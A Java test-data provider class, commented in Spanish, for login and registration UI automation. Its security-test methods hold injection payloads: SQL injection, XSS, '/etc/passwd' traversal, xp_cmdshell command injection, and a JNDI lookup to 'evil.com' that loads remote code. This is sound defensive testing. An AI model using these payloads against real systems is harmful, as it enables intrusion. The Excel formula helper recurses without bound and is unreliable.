package com.automatizacion.proyecto.datos;

import com.github.javafaker.Faker;
import org.apache.poi.ss.usermodel.*;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import java.io.*;
import java.util.*;

/**
 * Proveedor centralizado de datos para las pruebas.
 * Implementa diferentes fuentes de datos: CSV, Excel, generación dinámica.
 * 
 * Principios aplicados:
 * - SRP: Solo se encarga de proveer datos de prueba
 * - Strategy: Diferentes estrategias para obtener datos
 * - Factory: Creación de diferentes tipos de datos
 */
public class ProveedorDatos {
    
    private static final Faker faker = new Faker();
    private static final String RUTA_DATOS = "src/test/resources/datos/";
    
    /**
     * Genera credenciales de login válidas para pruebas.
     */
    public static Object[][] credencialesLoginValidas() {
        return new Object[][] {
            {"tomsmith", "SuperSecretPassword!", "Credenciales por defecto"},
            {"admin", "admin", "Credenciales administrativas"},
            {"testuser", "testpass123", "Usuario de prueba"},
            {"user1", "Password123!", "Usuario válido 1"},
            {"user2", "SecurePass456!", "Usuario válido 2"}
        };
    }
    
    /**
     * Genera credenciales inválidas para pruebas negativas.
     */
    public static Object[][] credencialesLoginInvalidas() {
        return new Object[][] {
            {"usuario_inexistente", "SuperSecretPassword!", "Usuario no existe"},
            {"tomsmith", "password_incorrecto", "Contraseña incorrecta"},
            {"", "SuperSecretPassword!", "Usuario vacío"},
            {"tomsmith", "", "Contraseña vacía"},
            {"", "", "Ambos campos vacíos"},
            {"admin", "123456", "Credenciales débiles"},
            {"test@test.com", "password", "Email como usuario"},
            {"user with spaces", "password", "Usuario con espacios"},
            {"very_long_username_that_exceeds_normal_limits", "password", "Usuario muy largo"},
            {"user", "very_long_password_that_exceeds_normal_security_limits_and_should_be_rejected", "Contraseña muy larga"},
            {"user123", "pass123", "Credenciales numéricas"},
            {"admin'; DROP TABLE users; --", "password", "SQL Injection intento"},
            {"<script>alert('xss')</script>", "password", "XSS intento"},
            {"user@#$%^&*()", "pass!@#$%^&*()", "Caracteres especiales"},
            {"UPPERCASE_USER", "UPPERCASE_PASS", "Todo en mayúsculas"}
        };
    }
    
    /**
     * Genera emails inválidos para pruebas de registro.
     */
    public static Object[][] emailsInvalidos() {
        return new Object[][] {
            {"email_sin_arroba.com", "Email sin @"},
            {"@dominio.com", "Email sin parte local"},
            {"email@", "Email sin dominio"},
            {"email@dominio", "Email sin TLD"},
            {"email con espacios@dominio.com", "Email con espacios"},
            {"email..doble@dominio.com", "Email con puntos consecutivos"},
            {"", "Email vacío"},
            {"texto_simple", "Texto sin formato email"},
            {"email@dominio@extra.com", "Email con @ doble"},
            {"email.@dominio.com", "Email termina con punto"},
            {".email@dominio.com", "Email inicia con punto"},
            {"email@dominio..com", "Dominio con puntos consecutivos"},
            {"email@.dominio.com", "Dominio inicia con punto"},
            {"email@dominio.com.", "Dominio termina con punto"},
            {"very.long.email.address.that.exceeds.normal.limits@very.long.domain.name.that.also.exceeds.limits.com", "Email excesivamente largo"},
            {"email@dominio_con_guion_bajo.com", "Dominio con guión bajo"},
            {"email@dominio-.com", "Dominio termina con guión"},
            {"email@-dominio.com", "Dominio inicia con guión"},
            {"email@192.168.1.1", "IP como dominio"},
            {"email@[192.168.1.1]", "IP entre corchetes"},
            {"email@dominio.c", "TLD muy corto"},
            {"email@dominio.toolongtld", "TLD muy largo"},
            {"email@", "Solo arroba al final"},
            {"@", "Solo arroba"},
            {"email@@dominio.com", "Doble arroba"},
            {"email@dominio,com", "Coma en lugar de punto"}
        };
    }
    
    /**
     * Genera contraseñas débiles para pruebas de seguridad.
     */
    public static Object[][] contrasenasDebiles() {
        return new Object[][] {
            {"123", "Muy corta - 3 caracteres"},
            {"1234567", "Solo números - 7 caracteres"},
            {"password", "Solo letras minúsculas"},
            {"PASSWORD", "Solo letras mayúsculas"},
            {"Password", "Letras sin números ni símbolos"},
            {"12345678", "Solo números - 8 caracteres"},
            {"", "Contraseña vacía"},
            {"abc", "Muy simple - 3 letras"},
            {"qwerty", "Patrón común de teclado"},
            {"admin", "Contraseña administrativa común"},
            {"password123", "Patrón común con números"},
            {"123456789", "Secuencia numérica"},
            {"aaaaaaa", "Caracteres repetidos"},
            {"passw", "Incompleta"},
            {" ", "Solo espacio"},
            {"pass word", "Contraseña con espacios"},
            {"123456", "Secuencia numérica común"},
            {"qwertyuiop", "Fila completa del teclado"},
            {"abcdef", "Secuencia alfabética"},
            {"welcome", "Palabra común"},
            {"login", "Palabra relacionada con login"},
            {"test", "Palabra de prueba"},
            {"user", "Palabra de usuario"},
            {"1q2w3e", "Patrón de teclado diagonal"},
            {"asd123", "Combinación simple"},
            {"zxc123", "Otra combinación simple"}
        };
    }
    
    /**
     * Genera datos de usuario completos con Faker.
     */
    public static Object[][] datosUsuarioAleatorios() {
        Object[][] datos = new Object[10][5]; // 10 usuarios con 5 campos cada uno
        
        for (int i = 0; i < 10; i++) {
            datos[i][0] = generarEmailUnico();
            datos[i][1] = generarContrasenaSegura();
            datos[i][2] = faker.name().firstName();
            datos[i][3] = faker.name().lastName();
            datos[i][4] = faker.phoneNumber().phoneNumber();
        }
        
        return datos;
    }
    
    /**
     * Genera navegadores para testing cross-browser.
     */
    public static Object[][] navegadoresCrossBrowser() {
        return new Object[][] {
            {"chrome", "Google Chrome", true},
            {"firefox", "Mozilla Firefox", true},
            {"edge", "Microsoft Edge", false}
        };
    }
    
    /**
     * Genera datos de prueba para validación de formularios.
     */
    public static Object[][] datosValidacionFormularios() {
        return new Object[][] {
            {"", "", "Ambos campos vacíos", false},
            {"usuario", "", "Solo usuario", false},
            {"", "password", "Solo contraseña", false},
            {"u", "p", "Campos muy cortos", false},
            {"usuario_válido", "contraseña_válida", "Datos válidos", true},
            {"   usuario   ", "   password   ", "Espacios extra", true},
            {"USUARIO", "PASSWORD", "Todo mayúsculas", true},
            {"usuario123", "password123", "Con números", true},
            {"user@domain.com", "Pass123!", "Email como usuario", true},
            {"very_long_username_that_might_cause_issues_in_some_systems", "very_long_password_that_might_cause_issues", "Campos muy largos", false}
        };
    }
    
    /**
     * Genera datos para pruebas de rendimiento.
     */
    public static Object[][] datosRendimiento() {
        Object[][] datos = new Object[50][3]; // 50 conjuntos de datos
        
        for (int i = 0; i < 50; i++) {
            datos[i][0] = "user" + (i + 1) + "@test.com";
            datos[i][1] = "Password" + (i + 1) + "!";
            datos[i][2] = "Dataset " + (i + 1);
        }
        
        return datos;
    }
    
    /**
     * Genera datos específicos para pruebas de seguridad.
     */
    public static Object[][] datosSeguridadAvanzada() {
        return new Object[][] {
            {"admin'; DROP TABLE users; --", "password", "SQL Injection clásico"},
            {"' OR '1'='1'; --", "anything", "SQL Injection OR"},
            {"<script>alert('XSS')</script>", "password", "XSS básico"},
            {"javascript:alert('XSS')", "password", "JavaScript injection"},
            {"../../etc/passwd", "password", "Path traversal"},
            {"{{7*7}}", "password", "Template injection"},
            {"${jndi:ldap://evil.com/a}", "password", "JNDI injection"},
            {"user\r\nSet-Cookie: evil=true", "password", "HTTP header injection"},
            {"user%00admin", "password", "Null byte injection"},
            {"user<svg onload=alert(1)>", "password", "SVG XSS"},
            {"user\"><img src=x onerror=alert(1)>", "password", "HTML injection"},
            {"user'; EXEC xp_cmdshell('dir'); --", "password", "Command injection"},
            {"admin'/**/OR/**/1=1--", "password", "SQL injection con comentarios"},
            {"user\npassword", "pass\nword", "Newline injection"},
            {"file:///etc/passwd", "password", "File scheme injection"}
        };
    }
    
    /**
     * Lee datos desde archivo CSV.
     */
    public static Object[][] leerDatosCSV(String nombreArchivo) {
        List<Object[]> datos = new ArrayList<>();
        String rutaArchivo = RUTA_DATOS + nombreArchivo;
        
        try (BufferedReader br = new BufferedReader(new FileReader(rutaArchivo))) {
            String linea;
            boolean primeraLinea = true;
            
            while ((linea = br.readLine()) != null) {
                // Saltar header si es la primera línea
                if (primeraLinea) {
                    primeraLinea = false;
                    continue;
                }
                
                String[] valores = procesarLineaCSV(linea);
                if (valores.length > 0 && !esLineaVacia(valores)) {
                    datos.add(valores);
                }
            }
            
        } catch (IOException e) {
            System.err.println("Error al leer archivo CSV: " + e.getMessage());
            // Retornar datos por defecto en caso de error
            return credencialesLoginInvalidas();
        }
        
        return datos.toArray(new Object[0][]);
    }
    
    /**
     * Lee datos desde archivo Excel.
     */
    public static Object[][] leerDatosExcel(String nombreArchivo, String nombreHoja) {
        List<Object[]> datos = new ArrayList<>();
        String rutaArchivo = RUTA_DATOS + nombreArchivo;
        
        try (FileInputStream fis = new FileInputStream(rutaArchivo);
             Workbook workbook = new XSSFWorkbook(fis)) {
            
            Sheet hoja = workbook.getSheet(nombreHoja);
            if (hoja == null) {
                hoja = workbook.getSheetAt(0); // Primera hoja por defecto
            }
            
            Iterator<Row> iteradorFilas = hoja.iterator();
            
            // Saltar header
            if (iteradorFilas.hasNext()) {
                iteradorFilas.next();
            }
            
            while (iteradorFilas.hasNext()) {
                Row fila = iteradorFilas.next();
                List<String> valoresFila = new ArrayList<>();
                
                Iterator<Cell> iteradorCeldas = fila.cellIterator();
                while (iteradorCeldas.hasNext()) {
                    Cell celda = iteradorCeldas.next();
                    valoresFila.add(obtenerValorCelda(celda));
                }
                
                if (!valoresFila.isEmpty() && !esFilaVacia(valoresFila)) {
                    datos.add(valoresFila.toArray(new String[0]));
                }
            }
            
        } catch (IOException e) {
            System.err.println("Error al leer archivo Excel: " + e.getMessage());
            // Retornar datos por defecto en caso de error
            return credencialesLoginInvalidas();
        }
        
        return datos.toArray(new Object[0][]);
    }
    
    /**
     * Crea archivo CSV de ejemplo con datos de prueba.
     */
    public static void crearArchivoCSVEjemplo() {
        String rutaArchivo = RUTA_DATOS + "credenciales_ejemplo.csv";
        
        try {
            // Crear directorio si no existe
            File directorio = new File(RUTA_DATOS);
            if (!directorio.exists()) {
                directorio.mkdirs();
            }
            
            try (PrintWriter writer = new PrintWriter(new FileWriter(rutaArchivo))) {
                writer.println("usuario,contrasena,descripcion,esperado");
                writer.println("tomsmith,SuperSecretPassword!,Usuario válido,true");
                writer.println("usuario_falso,password_falsa,Usuario inválido,false");
                writer.println("admin,admin123,Admin con contraseña débil,false");
                writer.println("test@email.com,TestPassword1!,Email como usuario,false");
                writer.println(",password123,Usuario vacío,false");
                writer.println("usuario_test,,Contraseña vacía,false");
                writer.println("user_spaces,pass word,Contraseña con espacios,false");
                writer.println("long_user_name_test,LongPassword123!,Credenciales largas,false");
                writer.println("special@#$,pass!@#$,Caracteres especiales,false");
                writer.println("normaluser,NormalPass123!,Usuario normal,true");
            }
            
            System.out.println("Archivo CSV de ejemplo creado: " + rutaArchivo);
            
        } catch (IOException e) {
            System.err.println("Error al crear archivo CSV: " + e.getMessage());
        }
    }
    
    /**
     * Crea archivo Excel de ejemplo con datos de prueba.
     */
    public static void crearArchivoExcelEjemplo() {
        String rutaArchivo = RUTA_DATOS + "usuarios_ejemplo.xlsx";
        
        try {
            // Crear directorio si no existe
            File directorio = new File(RUTA_DATOS);
            if (!directorio.exists()) {
                directorio.mkdirs();
            }
            
            try (Workbook workbook = new XSSFWorkbook();
                 FileOutputStream fileOut = new FileOutputStream(rutaArchivo)) {
                
                Sheet hoja = workbook.createSheet("Usuarios");
                
                // Crear header
                Row headerRow = hoja.createRow(0);
                headerRow.createCell(0).setCellValue("Email");
                headerRow.createCell(1).setCellValue("Contraseña");
                headerRow.createCell(2).setCellValue("Nombre");
                headerRow.createCell(3).setCellValue("Apellido");
                headerRow.createCell(4).setCellValue("Teléfono");
                headerRow.createCell(5).setCellValue("Descripción");
                headerRow.createCell(6).setCellValue("Válido");
                
                // Agregar datos de ejemplo
                Object[][] datosEjemplo = {
                    {"usuario1@test.com", "Password123!", "Juan", "Pérez", "123-456-7890", "Usuario de prueba 1", "true"},
                    {"usuario2@test.com", "Password456!", "María", "González", "098-765-4321", "Usuario de prueba 2", "true"},
                    {"admin@test.com", "AdminPass789!", "Roberto", "Admin", "555-123-4567", "Usuario administrador", "true"},
                    {"test@invalid", "weak", "Test", "User", "invalid-phone", "Datos inválidos", "false"},
                    {"", "password", "", "", "", "Campos vacíos", "false"},
                    {"user@valid.com", "", "Valid", "User", "123-456-7890", "Sin contraseña", "false"},
                    {"special@#$.com", "Pass!@#$123", "Special", "Characters", "+1-555-0123", "Caracteres especiales", "false"},
                    {"very.long.email.address@very.long.domain.name.com", "VeryLongPassword123!", "Long", "User", "1-800-LONG-NUM", "Datos muy largos", "false"},
                    {"normal.user@example.com", "NormalPass123!", "Normal", "User", "555-0123", "Usuario normal", "true"},
                    {"edge.case@test.co.uk", "EdgeCase!@#123", "Edge", "Case", "+44-20-1234-5678", "Caso borde internacional", "true"}
                };
                
                for (int i = 0; i < datosEjemplo.length; i++) {
                    Row fila = hoja.createRow(i + 1);
                    for (int j = 0; j < datosEjemplo[i].length; j++) {
                        fila.createCell(j).setCellValue(datosEjemplo[i][j].toString());
                    }
                }
                
                // Autoajustar columnas
                for (int i = 0; i < 7; i++) {
                    hoja.autoSizeColumn(i);
                }
                
                workbook.write(fileOut);
            }
            
            System.out.println("Archivo Excel de ejemplo creado: " + rutaArchivo);
            
        } catch (IOException e) {
            System.err.println("Error al crear archivo Excel: " + e.getMessage());
        }
    }
    
    /**
     * Genera un email único para evitar conflictos.
     */
    public static String generarEmailUnico() {
        String timestamp = String.valueOf(System.currentTimeMillis());
        String randomString = faker.lorem().word().toLowerCase();
        return String.format("usuario_%s_%s@prueba.com", randomString, timestamp);
    }
    
    /**
     * Genera una contraseña segura.
     */
    public static String generarContrasenaSegura() {
        // Generar contraseña que cumpla requisitos: min 8 chars, mayúscula, minúscula, número, símbolo
        String minusculas = "abcdefghijklmnopqrstuvwxyz";
        String mayusculas = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        String numeros = "0123456789";
        String simbolos = "!@#$%^&*()_+-=[]{}|;:,.<>?";
        
        StringBuilder password = new StringBuilder();
        Random random = new Random();
        
        // Asegurar al menos un carácter de cada tipo
        password.append(minusculas.charAt(random.nextInt(minusculas.length())));
        password.append(mayusculas.charAt(random.nextInt(mayusculas.length())));
        password.append(numeros.charAt(random.nextInt(numeros.length())));
        password.append(simbolos.charAt(random.nextInt(simbolos.length())));
        
        // Completar hasta longitud deseada (8-16 caracteres)
        String todosCaracteres = minusculas + mayusculas + numeros + simbolos;
        int longitudTotal = 8 + random.nextInt(9); // 8-16 caracteres
        
        for (int i = 4; i < longitudTotal; i++) {
            password.append(todosCaracteres.charAt(random.nextInt(todosCaracteres.length())));
        }
        
        // Mezclar caracteres
        char[] chars = password.toString().toCharArray();
        for (int i = chars.length - 1; i > 0; i--) {
            int j = random.nextInt(i + 1);
            char temp = chars[i];
            chars[i] = chars[j];
            chars[j] = temp;
        }
        
        return new String(chars);
    }
    
    /**
     * Genera datos de registro completos.
     */
    public static Map<String, String> generarDatosRegistroCompletos() {
        Map<String, String> datos = new HashMap<>();
        datos.put("email", generarEmailUnico());
        datos.put("password", generarContrasenaSegura());
        datos.put("confirmPassword", datos.get("password")); // Misma contraseña
        datos.put("firstName", faker.name().firstName());
        datos.put("lastName", faker.name().lastName());
        datos.put("phone", faker.phoneNumber().phoneNumber());
        datos.put("address", faker.address().fullAddress());
        datos.put("city", faker.address().city());
        datos.put("zipCode", faker.address().zipCode());
        datos.put("country", faker.address().country());
        return datos;
    }
    
    /**
     * Obtiene el valor de una celda Excel como String.
     */
    private static String obtenerValorCelda(Cell celda) {
        if (celda == null) {
            return "";
        }
        
        switch (celda.getCellType()) {
            case STRING:
                return celda.getStringCellValue().trim();
            case NUMERIC:
                if (DateUtil.isCellDateFormatted(celda)) {
                    return celda.getDateCellValue().toString();
                } else {
                    double valor = celda.getNumericCellValue();
                    if (valor == (long) valor) {
                        return String.valueOf((long) valor);
                    } else {
                        return String.valueOf(valor);
                    }
                }
            case BOOLEAN:
                return String.valueOf(celda.getBooleanCellValue());
            case FORMULA:
                try {
                    return obtenerValorCelda(celda); // Recursión para evaluar fórmula
                } catch (Exception e) {
                    return celda.getCellFormula();
                }
            case BLANK:
                return "";
            default:
                return "";
        }
    }
    
    /**
     * Procesa una línea CSV manejando comillas y comas.
     */
    private static String[] procesarLineaCSV(String linea) {
        List<String> campos = new ArrayList<>();
        StringBuilder campoActual = new StringBuilder();
        boolean dentroComillas = false;
        
        for (int i = 0; i < linea.length(); i++) {
            char c = linea.charAt(i);
            
            if (c == '"') {
                dentroComillas = !dentroComillas;
            } else if (c == ',' && !dentroComillas) {
                campos.add(campoActual.toString().trim());
                campoActual = new StringBuilder();
            } else {
                campoActual.append(c);
            }
        }
        
        campos.add(campoActual.toString().trim());
        return campos.toArray(new String[0]);
    }
    
    /**
     * Verifica si una línea está vacía.
     */
    private static boolean esLineaVacia(String[] valores) {
        if (valores == null || valores.length == 0) {
            return true;
        }
        
        for (String valor : valores) {
            if (valor != null && !valor.trim().isEmpty()) {
                return false;
            }
        }
        
        return true;
    }
    
    /**
     * Verifica si una fila de Excel está vacía.
     */
    private static boolean esFilaVacia(List<String> valores) {
        if (valores == null || valores.isEmpty()) {
            return true;
        }
        
        for (String valor : valores) {
            if (valor != null && !valor.trim().isEmpty()) {
                return false;
            }
        }
        
        return true;
    }
    
    /**
     * Valida si un email tiene formato válido.
     */
    public static boolean esEmailValido(String email) {
        if (email == null || email.trim().isEmpty()) {
            return false;
        }
        String patron = "^[A-Za-z0-9+_.-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$";
        return email.matches(patron);
    }
    
    /**
     * Valida si una contraseña es segura.
     */
    public static boolean esContrasenaSegura(String password) {
        if (password == null || password.length() < 8) {
            return false;
        }
        
        boolean tieneMinuscula = password.matches(".*[a-z].*");
        boolean tieneMayuscula = password.matches(".*[A-Z].*");
        boolean tieneNumero = password.matches(".*\\d.*");
        boolean tieneEspecial = password.matches(".*[!@#$%^&*()_+\\-=\\[\\]{};':\"\\\\|,.<>\\/?].*");
        
        return tieneMinuscula && tieneMayuscula && tieneNumero && tieneEspecial;
    }
    
    /**
     * Genera datos de prueba según el tipo especificado.
     */
    public static Object[][] generarDatosPorTipo(String tipo, int cantidad) {
        switch (tipo.toLowerCase()) {
            case "emails_invalidos":
                return emailsInvalidos();
            case "passwords_debiles":
                return contrasenasDebiles();
            case "usuarios_aleatorios":
                return generarUsuariosAleatorios(cantidad);
            case "credenciales_validas":
                return credencialesLoginValidas();
            case "navegadores":
                return navegadoresCrossBrowser();
            case "validacion_formularios":
                return datosValidacionFormularios();
            case "rendimiento":
                return datosRendimiento();
            case "seguridad":
                return datosSeguridadAvanzada();
            default:
                return datosUsuarioAleatorios();
        }
    }
    
    /**
     * Genera usuarios aleatorios en cantidad especificada.
     */
    private static Object[][] generarUsuariosAleatorios(int cantidad) {
        Object[][] usuarios = new Object[cantidad][5];
        
        for (int i = 0; i < cantidad; i++) {
            usuarios[i][0] = generarEmailUnico();
            usuarios[i][1] = generarContrasenaSegura();
            usuarios[i][2] = faker.name().firstName();
            usuarios[i][3] = faker.name().lastName();
            usuarios[i][4] = faker.phoneNumber().phoneNumber();
        }
        
        return usuarios;
    }
    
    /**
     * Inicializa archivos de datos de ejemplo si no existen.
     */
    public static void inicializarArchivosEjemplo() {
        File directorioDatos = new File(RUTA_DATOS);
        if (!directorioDatos.exists()) {
            directorioDatos.mkdirs();
            System.out.println("Directorio de datos creado: " + RUTA_DATOS);
        }
        
        File archivoCSV = new File(RUTA_DATOS + "credenciales_ejemplo.csv");
        if (!archivoCSV.exists()) {
            crearArchivoCSVEjemplo();
        }
        
        File archivoExcel = new File(RUTA_DATOS + "usuarios_ejemplo.xlsx");
        if (!archivoExcel.exists()) {
            crearArchivoExcelEjemplo();
        }
    }
    
    /**
     * Obtiene estadísticas de los datos generados.
     */
    public static Map<String, Object> obtenerEstadisticasDatos() {
        Map<String, Object> stats = new HashMap<>();
        
        stats.put("credenciales_validas", credencialesLoginValidas().length);
        stats.put("credenciales_invalidas", credencialesLoginInvalidas().length);
        stats.put("emails_invalidos", emailsInvalidos().length);
        stats.put("passwords_debiles", contrasenasDebiles().length);
        stats.put("navegadores_soportados", navegadoresCrossBrowser().length);
        stats.put("casos_seguridad", datosSeguridadAvanzada().length);
        stats.put("validaciones_formulario", datosValidacionFormularios().length);
        
        return stats;
    }
    
    /**
     * Limpia y valida datos de entrada.
     */
    public static String limpiarDato(String dato) {
        if (dato == null) {
            return "";
        }
        
        return dato.trim()
                   .replaceAll("\\s+", " ") // Múltiples espacios a uno solo
                   .replaceAll("[\r\n\t]", ""); // Remover caracteres de control
    }
    
    /**
     * Genera datos de prueba para casos edge.
     */
    public static Object[][] datosCasosEdge() {
        return new Object[][] {
            {"", "", "Campos completamente vacíos"},
            {" ", " ", "Solo espacios"},
            {"a", "b", "Un solo carácter cada uno"},
            {"user", "pass", "Mínimo de caracteres"},
            {generarTextoLargo(1000), generarTextoLargo(1000), "Texto extremadamente largo"},
            {"user\n\r\t", "pass\n\r\t", "Con caracteres de control"},
            {"user\u0000", "pass\u0000", "Con null bytes"},
            {"user🙂", "pass🙂", "Con emojis"},
            {"userñáéíóú", "passñáéíóú", "Con caracteres especiales del español"},
            {"用户", "密码", "Con caracteres Unicode (chino)"},
            {"пользователь", "пароль", "Con caracteres cirílicos"},
            {"משתמש", "סיסמה", "Con caracteres hebreos"}
        };
    }
    
    /**
     * Genera texto largo para pruebas de límites.
     */
    private static String generarTextoLargo(int longitud) {
        StringBuilder sb = new StringBuilder();
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        
        for (int i = 0; i < longitud; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        
        return sb.toString();
    }
    
    /**
     * Exporta datos a archivo JSON para integración con otras herramientas.
     */
    public static void exportarDatosJSON(String nombreArchivo, Object[][] datos) {
        String rutaArchivo = RUTA_DATOS + nombreArchivo;
        
        try (FileWriter writer = new FileWriter(rutaArchivo)) {
            writer.write("[\n");
            
            for (int i = 0; i < datos.length; i++) {
                writer.write("  {\n");
                Object[] fila = datos[i];
                
                for (int j = 0; j < fila.length; j++) {
                    writer.write(String.format("    \"campo%d\": \"%s\"", j + 1, fila[j].toString()));
                    if (j < fila.length - 1) {
                        writer.write(",");
                    }
                    writer.write("\n");
                }
                
                writer.write("  }");
                if (i < datos.length - 1) {
                    writer.write(",");
                }
                writer.write("\n");
            }
            
            writer.write("]\n");
            System.out.println("Datos exportados a JSON: " + rutaArchivo);
            
        } catch (IOException e) {
            System.err.println("Error al exportar datos a JSON: " + e.getMessage());
        }
    }
    
    /**
     * Valida integridad de archivos de datos.
     */
    public static boolean validarIntegridadArchivos() {
        boolean todosValidos = true;
        
        // Verificar directorio de datos
        File directorio = new File(RUTA_DATOS);
        if (!directorio.exists()) {
            System.err.println("Directorio de datos no existe: " + RUTA_DATOS);
            return false;
        }
        
        // Verificar archivos críticos
        String[] archivosRequeridos = {
            "credenciales_ejemplo.csv",
            "usuarios_ejemplo.xlsx"
        };
        
        for (String archivo : archivosRequeridos) {
            File file = new File(RUTA_DATOS + archivo);
            if (!file.exists()) {
                System.err.println("Archivo requerido no existe: " + archivo);
                todosValidos = false;
            } else if (!file.canRead()) {
                System.err.println("No se puede leer archivo: " + archivo);
                todosValidos = false;
            }
        }
        
        return todosValidos;
    }
    
    /**
     * Genera reporte de cobertura de datos de prueba.
     */
    public static String generarReporteCobertura() {
        StringBuilder reporte = new StringBuilder();
        reporte.append("=== REPORTE DE COBERTURA DE DATOS DE PRUEBA ===\n\n");
        
        Map<String, Object> stats = obtenerEstadisticasDatos();
        
        reporte.append("Tipos de datos disponibles:\n");
        for (Map.Entry<String, Object> entry : stats.entrySet()) {
            reporte.append(String.format("- %s: %s casos\n", 
                entry.getKey().replace("_", " "), entry.getValue()));
        }
        
        reporte.append("\nCategorías de prueba cubiertas:\n");
        reporte.append("✓ Credenciales válidas e inválidas\n");
        reporte.append("✓ Validación de emails\n");
        reporte.append("✓ Seguridad de contraseñas\n");
        reporte.append("✓ Cross-browser testing\n");
        reporte.append("✓ Casos edge y límites\n");
        reporte.append("✓ Pruebas de seguridad\n");
        reporte.append("✓ Validación de formularios\n");
        reporte.append("✓ Datos de rendimiento\n");
        
        reporte.append("\nIntegridad de archivos: ");
        reporte.append(validarIntegridadArchivos() ? "✓ OK" : "✗ FALLO");
        
        return reporte.toString();
    }
}